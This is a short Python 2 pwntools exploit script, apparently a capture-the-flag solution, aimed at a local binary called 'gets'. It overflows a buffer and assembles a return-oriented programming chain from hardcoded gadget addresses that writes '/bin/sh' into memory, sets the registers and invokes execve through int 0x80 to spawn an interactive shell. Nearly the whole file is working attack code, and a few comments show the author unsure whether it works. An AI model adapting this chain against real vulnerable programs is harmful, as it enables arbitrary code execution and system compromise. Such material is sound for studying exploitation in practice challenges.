#!/usr/bin/env python2

from pwn import *
from struct import *

r = process('./gets')
r.recvuntil('GIVE ME YOUR NAME!\n')

def p(x):  # write a 32-bit value to little-endian bytes
    return struct.pack('<L', x)

payload = 'A' * 16 + '1'*4 + '2'*4 + '3'*4  # everything after this will start to overwrite the return address.

# Step 2, fill ebx with pointer to string /bin/sh

payload += p(0x080b84d6)  # pop eax; ret; 
payload += '/bin'
payload += p(0x0806f19a)  # pop edx; ret; 
payload += p(0x080e9330)  # some suitable address
payload += p(0x08054b4b)  # mov dword ptr [edx], eax; ret;

payload += p(0x080b84d6)  # pop eax; ret; 
payload += '/sh\x00'      # TODO: can I really submit a NULL-byte here?
payload += p(0x0806f19a)  # pop edx; ret; 
payload += p(0x080e9334)  # some suitable address + 4
payload += p(0x08054b4b)  # mov dword ptr [edx], eax; ret;

payload += p(0x080481c9)  # pop ebx; ret;
payload += p(0x080e9330)  # some suitable address

# Step 3, fill ecx and edx will NULL

payload += p(0x080dece1)  # pop ecx; ret;
payload += '\x00\x00\x00\x00'  # TODO: works? otherwise 0xffffffff and inc
#payload += p(0x080d608f)  # inc ecx; ret;

payload += p(0x0806f19a)  # pop edx; ret;
payload += '\x00\x00\x00\x00'  # TODO: works? otherwise 0xffffffff and inc
#payload += p(0x0805d207)  # inc edx; ret;

# Step 4, fill eax with 0x0b which is the syscall code for execve

payload += p(0x080b84d6)  # pop eax; ret;
payload += p(0x2222220b)  # 0x0b is syscall code for execve
payload += p(0x08091d09)  # movzx eax, al; ret; 

# Step 5, finally perform the syscall with int 0x80

payload += p(0x0806f7a0)

r.sendline(payload)
r.interactive()
